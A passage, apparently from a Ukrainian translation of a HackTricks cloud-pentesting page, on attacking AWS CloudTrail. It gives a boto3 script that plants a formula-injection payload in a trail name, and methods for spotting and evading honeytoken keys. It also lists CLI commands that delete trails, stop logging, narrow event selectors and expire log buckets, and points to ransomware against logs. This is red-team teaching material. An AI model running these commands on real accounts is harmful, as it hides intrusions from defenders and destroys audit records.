–û—Ç–∂–µ, –ö–æ–Ω—Å—É–ª—å—Ç–∞–Ω—Ç –¥–æ—Å—Ç—É–ø—É —ñ–Ω—Ñ–æ—Ä–º—É—î –ø—Ä–æ **–Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏, —è–∫—ñ –Ω–∞–¥–∞—é—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º**, —â–æ–± –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –º—ñ–≥ —ó—Ö –≤–∏–¥–∞–ª–∏—Ç–∏
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## –î—ñ—ó

### –ü–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

–ú–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ CVS-—ñ–Ω'—î–∫—Ü—ñ—é –≤ CloudTrail, —è–∫–∞ –≤–∏–∫–æ–Ω–∞—î –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥, —è–∫—â–æ –∂—É—Ä–Ω–∞–ª–∏ –µ–∫—Å–ø–æ—Ä—Ç—É—é—Ç—å—Å—è —É —Ñ–æ—Ä–º–∞—Ç—ñ CSV —ñ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å—Å—è –≤ Excel.\
–ù–∞—Å—Ç—É–ø–Ω–∏–π –∫–æ–¥ –∑–≥–µ–Ω–µ—Ä—É—î –∑–∞–ø–∏—Å –∂—É—Ä–Ω–∞–ª—É –∑ –ø–æ–≥–∞–Ω–æ—é –Ω–∞–∑–≤–æ—é Trail, —â–æ –º—ñ—Å—Ç–∏—Ç—å –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ CSV-—ñ–Ω'—î–∫—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Å—Ç–æ—Ä—ñ–Ω–∫—É:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü—é –∫–æ–Ω–∫—Ä–µ—Ç–Ω—É —Ç–µ—Ö–Ω—ñ–∫—É –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **–û–±—Ö—ñ–¥ –≤–∏—è–≤–ª–µ–Ω–Ω—è**

### HoneyTokens **–æ–±—Ö—ñ–¥**

Honeytokens —Å—Ç–≤–æ—Ä—é—é—Ç—å—Å—è –¥–ª—è **–≤–∏—è–≤–ª–µ–Ω–Ω—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó**. –£ –≤–∏–ø–∞–¥–∫—É –∑ AWS, —Ü–µ **–∫–ª—é—á—ñ AWS, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —è–∫–∏—Ö –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç—å—Å—è**, —è–∫—â–æ —â–æ—Å—å –≤–∏–∫–ª–∏–∫–∞—î –¥—ñ—é –∑ —Ü–∏–º –∫–ª—é—á–µ–º, —Ç–æ —Ö—Ç–æ—Å—å, –Ω–∞–ø–µ–≤–Ω–æ, –≤–∫—Ä–∞–ª–∏ —Ü–µ–π –∫–ª—é—á.

–û–¥–Ω–∞–∫, Honeytokens, —Ç–∞–∫—ñ —è–∫ —Ç—ñ, —â–æ —Å—Ç–≤–æ—Ä–µ–Ω—ñ [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren), –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –≤–ø—ñ–∑–Ω–∞–≤–∞–Ω–µ —ñ–º'—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É, –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –æ–¥–∏–Ω —ñ —Ç–æ–π –∂–µ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É AWS –¥–ª—è –≤—Å—ñ—Ö —Å–≤–æ—ó—Ö –∫–ª—ñ—î–Ω—Ç—ñ–≤. –¢–æ–º—É, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–º'—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Ç–∞/–∞–±–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –±–µ–∑ —Ç–æ–≥–æ, —â–æ–± Cloudtrail —Å—Ç–≤–æ—Ä–∏–≤ –±—É–¥—å-—è–∫–∏–π –∂—É—Ä–Ω–∞–ª, **–≤–∏ –º–æ–≥–ª–∏ –± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —á–∏ —î –∫–ª—é—á honeytoken —á–∏ –Ω—ñ**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) –º–∞—î –¥–µ—è–∫—ñ –ø—Ä–∞–≤–∏–ª–∞ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è, —á–∏ –Ω–∞–ª–µ–∂–∏—Ç—å –∫–ª—é—á [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* –Ø–∫—â–æ **`canarytokens.org`** –∑'—è–≤–ª—è—î—Ç—å—Å—è –≤ –Ω–∞–∑–≤—ñ —Ä–æ–ª—ñ –∞–±–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É **`534261010715`** –∑'—è–≤–ª—è—î—Ç—å—Å—è –≤ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—ñ –ø—Ä–æ –ø–æ–º–∏–ª–∫—É.
* –¢–µ—Å—Ç—É—é—á–∏ —ó—Ö –Ω–µ—â–æ–¥–∞–≤–Ω–æ, –≤–æ–Ω–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å **`717712589309`** —ñ –≤—Å–µ —â–µ –º–∞—é—Ç—å —Ä—è–¥–æ–∫ **`canarytokens.com`** –≤ –Ω–∞–∑–≤—ñ.
* –Ø–∫—â–æ **`SpaceCrab`** –∑'—è–≤–ª—è—î—Ç—å—Å—è –≤ –Ω–∞–∑–≤—ñ —Ä–æ–ª—ñ –≤ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—ñ –ø—Ä–æ –ø–æ–º–∏–ª–∫—É
* **SpaceSiren** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **uuids** –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó —ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* –Ø–∫—â–æ **—ñ–º'—è –≤–∏–≥–ª—è–¥–∞—î —è–∫ –≤–∏–ø–∞–¥–∫–æ–≤–æ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–µ**, —î –≤–∏—Å–æ–∫—ñ –π–º–æ–≤—ñ—Ä–Ω–æ—Å—Ç—ñ, —â–æ —Ü–µ HoneyToken.

#### –û—Ç—Ä–∏–º–∞—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∑ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞ –∫–ª—é—á–∞

–í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ **—ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É** –∑ **–∑–∞–∫–æ–¥–æ–≤–∞–Ω–æ–≥–æ** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **–∫–ª—é—á–∞ –¥–æ—Å—Ç—É–ø—É**, —è–∫ [**–ø–æ—è—Å–Ω–µ–Ω–æ —Ç—É—Ç**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) —ñ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∑—ñ —Å–≤–æ—ó–º —Å–ø–∏—Å–∫–æ–º Honeytokens AWS –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Check more information in the [**–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–º—É –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—ñ**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### –ù–µ –≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –∂—É—Ä–Ω–∞–ª

–ù–∞–π–µ—Ñ–µ–∫—Ç–∏–≤–Ω—ñ—à–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ –¥–ª—è —Ü—å–æ–≥–æ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ —î –ø—Ä–æ—Å—Ç–æ—é. –ü—Ä–æ—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ –∫–ª—é—á, —è–∫–∏–π –≤–∏ —â–æ–π–Ω–æ –∑–Ω–∞–π—à–ª–∏, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —è–∫–æ—ó—Å—å —Å–ª—É–∂–±–∏ —É –≤–∞—à–æ–º—É –≤–ª–∞—Å–Ω–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞. –¶–µ –∑–º—É—Å–∏—Ç—å **CloudTrail –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –∂—É—Ä–Ω–∞–ª —É –í–ê–®–û–ú–£ –í–õ–ê–°–ù–û–ú–£ AWS –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ, –∞ –Ω–µ —É –∂–µ—Ä—Ç–≤–∏**.

–°–ø—Ä–∞–≤–∞ –≤ —Ç–æ–º—É, —â–æ –≤–∏–≤—ñ–¥ –ø–æ–∫–∞–∂–µ –≤–∞–º –ø–æ–º–∏–ª–∫—É, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Ç–∞ —ñ–º'—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É, —Ç–æ–º—É **–≤–∏ –∑–º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —á–∏ —Ü–µ Honeytoken**.

#### AWS —Å–ª—É–∂–±–∏ –±–µ–∑ –∂—É—Ä–Ω–∞–ª—ñ–≤

–£ –º–∏–Ω—É–ª–æ–º—É —ñ—Å–Ω—É–≤–∞–ª–∏ –¥–µ—è–∫—ñ **AWS —Å–ª—É–∂–±–∏, —è–∫—ñ –Ω–µ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å –∂—É—Ä–Ω–∞–ª–∏ –¥–æ CloudTrail** (–∑–Ω–∞–π–¥—ñ—Ç—å [—Å–ø–∏—Å–æ–∫ —Ç—É—Ç](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). –î–µ—è–∫—ñ –∑ —Ü–∏—Ö —Å–ª—É–∂–± **–≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å** –∑ **–ø–æ–º–∏–ª–∫–æ—é**, —â–æ –º—ñ—Å—Ç–∏—Ç—å **ARN –∫–ª—é—á–æ–≤–æ—ó —Ä–æ–ª—ñ**, —è–∫—â–æ —Ö—Ç–æ—Å—å –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π (–∫–ª—é—á Honeytoken) –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ –Ω–∏—Ö –¥–æ—Å—Ç—É–ø.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ ARN –∫–ª—é—á–∞, –Ω–µ –≤–∏–∫–ª–∏–∫–∞—é—á–∏ –∂–æ–¥–Ω–æ–≥–æ –∂—É—Ä–Ω–∞–ª—É**. –£ ARN –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø–æ–±–∞—á–∏—Ç–∏ **—ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É AWS —Ç–∞ —ñ–º'—è**, –ª–µ–≥–∫–æ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∏ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –∫–æ–º–ø–∞–Ω—ñ–π HoneyToken —Ç–∞ —ó—Ö–Ω—ñ —ñ–º–µ–Ω–∞, —Ç–æ–º—É —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∑–Ω–∞—á–∏—Ç–∏, —á–∏ —î —Ç–æ–∫–µ–Ω HoneyToken.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤—Å—ñ –ø—É–±–ª—ñ—á–Ω—ñ API, –≤–∏—è–≤–ª–µ–Ω—ñ —è–∫ —Ç–∞–∫—ñ, —â–æ –Ω–µ —Å—Ç–≤–æ—Ä—é—é—Ç—å –∂—É—Ä–Ω–∞–ª–∏ CloudTrail, —Ç–µ–ø–µ—Ä –≤–∏–ø—Ä–∞–≤–ª–µ–Ω—ñ, —Ç–æ–º—É, –º–æ–∂–ª–∏–≤–æ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞–π—Ç–∏ —Å–≤–æ—ó –≤–ª–∞—Å–Ω—ñ...

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [**–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### –î–æ—Å—Ç—É–ø –¥–æ —Ç—Ä–µ—Ç—å–æ—ó —ñ–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–∏

–î–µ—è–∫—ñ —Å–ª—É–∂–±–∏ AWS **—Å—Ç–≤–æ—Ä—é—é—Ç—å –ø–µ–≤–Ω—É —ñ–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—É**, —Ç–∞–∫—É —è–∫ **–ë–∞–∑–∏ –¥–∞–Ω–∏—Ö** –∞–±–æ **Kubernetes** –∫–ª–∞—Å—Ç–µ—Ä–∏ (EKS). –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á, **—è–∫–∏–π –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ —Å–ø—ñ–ª–∫—É—î—Ç—å—Å—è –∑ —Ü–∏–º–∏ —Å–ª—É–∂–±–∞–º–∏** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, API Kubernetes) **–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ AWS API**, —Ç–æ–º—É CloudTrail –Ω–µ –∑–º–æ–∂–µ –ø–æ–±–∞—á–∏—Ç–∏ —Ü—é –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—é.

–û—Ç–∂–µ, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑ –¥–æ—Å—Ç—É–ø–æ–º –¥–æ EKS, —è–∫–∏–π –≤–∏—è–≤–∏–≤ URL API EKS, –º–æ–∂–µ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω –ª–æ–∫–∞–ª—å–Ω–æ —ñ **—Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ API —Å–ª—É–∂–±–æ—é –±–µ–∑ –≤–∏—è–≤–ª–µ–Ω–Ω—è Cloudtrail**.

–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### –ú–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó CloudTrail

#### –í–∏–¥–∞–ª–∏—Ç–∏ —Å–ª—ñ–¥–∏
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### –ó—É–ø–∏–Ω–∏—Ç–∏ —Å–ª—ñ–¥–∏
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### –í–∏–º–∫–Ω–µ–Ω–Ω—è –≤–µ–¥–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ —É –∫—ñ–ª—å–∫–æ—Ö —Ä–µ–≥—ñ–æ–Ω–∞—Ö

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### –í–∏–º–∫–Ω–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—é–≤–∞–Ω–Ω—è –∑–∞ –≤–∏–±–æ—Ä–æ–º –ø–æ–¥—ñ–π

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

–£ –ø–µ—Ä—à–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –Ω–∞–¥–∞—î—Ç—å—Å—è –æ–¥–∏–Ω —Å–µ–ª–µ–∫—Ç–æ—Ä –ø–æ–¥—ñ–π —É –≤–∏–≥–ª—è–¥—ñ –º–∞—Å–∏–≤—É JSON –∑ –æ–¥–Ω–∏–º –æ–±'—î–∫—Ç–æ–º. `"ReadWriteType": "ReadOnly"` –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —â–æ **—Å–µ–ª–µ–∫—Ç–æ—Ä –ø–æ–¥—ñ–π –ø–æ–≤–∏–Ω–µ–Ω –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ –ª–∏—à–µ –ø–æ–¥—ñ—ó —Ç—ñ–ª—å–∫–∏ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è** (—Ç–æ–º—É CloudTrail insights **–Ω–µ –±—É–¥–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –∑–∞–ø–∏—Å** –ø–æ–¥—ñ—ó, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥).

–í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Å–µ–ª–µ–∫—Ç–æ—Ä –ø–æ–¥—ñ–π –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ –≤–∞—à–∏—Ö –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –≤–∏–º–æ–≥.

#### –í–∏–¥–∞–ª–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ —á–µ—Ä–µ–∑ –ø–æ–ª—ñ—Ç–∏–∫—É –∂–∏—Ç—Ç—î–≤–æ–≥–æ —Ü–∏–∫–ª—É S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### –ú–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –±–∞–∫–µ—Ç—É

* –í–∏–¥–∞–ª–∏—Ç–∏ S3 –±–∞–∫–µ—Ç
* –ó–º—ñ–Ω–∏—Ç–∏ –ø–æ–ª—ñ—Ç–∏–∫—É –±–∞–∫–µ—Ç—É, —â–æ–± –∑–∞–±–æ—Ä–æ–Ω–∏—Ç–∏ –±—É–¥—å-—è–∫—ñ –∑–∞–ø–∏—Å–∏ –∑ —Å–µ—Ä–≤—ñ—Å—É CloudTrail
* –î–æ–¥–∞—Ç–∏ –ø–æ–ª—ñ—Ç–∏–∫—É –∂–∏—Ç—Ç—î–≤–æ–≥–æ —Ü–∏–∫–ª—É –¥–æ S3 –±–∞–∫–µ—Ç—É –¥–ª—è –≤–∏–¥–∞–ª–µ–Ω–Ω—è –æ–±'—î–∫—Ç—ñ–≤
* –í–∏–º–∫–Ω—É—Ç–∏ –∫–ª—é—á kms, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ CloudTrail

### Ransomware Cloudtrail

#### Ransomware S3

–í–∏ –º–æ–∂–µ—Ç–µ **–∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –∞—Å–∏–º–µ—Ç—Ä–∏—á–Ω–∏–π –∫–ª—é—á** —ñ –∑–º—É—Å–∏—Ç–∏ **CloudTrail –∑–∞—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ** —Ü–∏–º –∫–ª—é—á–µ–º —ñ **–≤–∏–¥–∞–ª–∏—Ç–∏ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á**, —â–æ–± –≤–º—ñ—Å—Ç CloudTrail –Ω–µ –º–æ–∂–Ω–∞ –±—É–ª–æ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏.\
–¶–µ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É **S3-KMS ransomware**, –ø–æ—è—Å–Ω–µ–Ω–µ –≤:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS ransomware**

–¶–µ –Ω–∞–π–ø—Ä–æ—Å—Ç—ñ—à–∏–π —Å–ø–æ—Å—ñ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—é –∞—Ç–∞–∫—É –∑ —ñ–Ω—à–∏–º–∏ –≤–∏–º–æ–≥–∞–º–∏ –¥–æ –¥–æ–∑–≤–æ–ª—ñ–≤:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **–ü–æ—Å–∏–ª–∞–Ω–Ω—è**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
